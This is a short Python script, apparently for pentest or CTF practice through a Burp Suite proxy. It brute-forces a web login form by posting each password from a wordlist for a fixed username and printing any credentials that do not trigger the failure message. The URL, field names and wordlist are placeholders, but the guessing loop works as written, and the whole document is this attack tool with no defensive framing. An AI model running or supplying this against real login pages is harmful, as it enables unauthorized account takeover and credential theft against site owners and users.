import requests

url = "login form url"
wordlist = "{path to wordlist}"

login_fail_message = "message that appears when login fails"

# to intercept requests with burp suite
proxy = {'http' : '127.0.0.1:8080' }


def login(username, password):

    username_field_name = "username field name attribute value"
    password_field_name = "password field name attribute value"

    creds = {
            username_field_name : username,
            password_field_name : password,
            }
    
    r = requests.post(url, data=creds, proxies=proxy)

    if login_fail_message in r.text:
        pass
    else:
        print("\nCredentials found!")
        print(f"{username}:{password}")
        return True

wordlist = open(wordlist, encoding='latin-1').readlines()

line = 0
for password in wordlist:
    if line % 500 == 0:
        print(f"Tried {line} lines")
    line += 1
    if login("username", password.strip()) == True:
        break
